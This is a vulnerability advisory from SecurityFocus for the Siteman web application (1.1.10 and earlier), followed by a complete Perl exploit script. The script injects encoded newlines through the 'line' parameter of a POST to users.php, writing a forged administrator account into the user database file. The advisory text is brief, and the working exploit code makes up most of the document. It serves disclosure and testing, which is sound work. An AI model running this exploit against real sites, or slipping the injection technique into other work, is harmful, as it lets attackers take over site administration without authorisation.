source: http://www.securityfocus.com/bid/12304/info

Siteman is reported prone to a vulnerability that may allow users to gain elevated privileges. This issue results from insufficient sanitization of user-supplied data.

Apparently, an attacker can supply additional lines to the stream used to write to the user database file through a URI parameter. This can allow the attacker to corrupt the user database file and potentially gain administrative privileges to the Siteman application.

Siteman 1.1.10 and prior versions are affected by this vulnerability. 

#!/usr/bin/perl -w
#
# Exploit by Noam Rathaus - Beyond Security Ltd.
# Exploit for the SiteMan vulnerability discovered by: "amironline452" <amironline452@alphahackers.com>
#

use Digest::MD5 qw(md5 md5_hex md5_base64);
use IO::Socket;
use strict;


# ./siteman.pl / vulnerable.host
my $Path = shift;
my $Host = shift;
my $Username = shift;
my $Password = md5_hex(shift);

print "Path: $Path\nHost: $Host\nUsername: $Username\nPassword: $Password\n";

my $content = "do=docreate&line=%0A%0D$Username|$Password|5|$Username\@hacked.com|". "$Username|1105956827|$Username|$Password|0|0|0|hackers%0A%0D";

my $request = "POST $Path/users.php HTTP/1.1\r
Host: $Host\r
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7) Gecko/20040928 Firefox/0.9.3\r
Accept: text/html;q=0.9,text/plain;q=0.8,*/*;q=0.5\r
Accept-Language: en-us,en;q=0.5\r
Accept-Encoding: gzip,deflate\r
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r
Content-Length: ".length($content)."\r
Content-Type: application/x-www-form-urlencoded\r
Connection: close\r
\r
$content";

my $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $Host, PeerPort => "8080");

unless ($remote) { die "cannot connect to http daemon on $Host" }

print "connected\n";

print "request: [$request]\n";
print $remote $request. "\r\n";

while (<$remote>)
{
 print $_;
}

close ($remote);

print "\n\n--- done ---\n";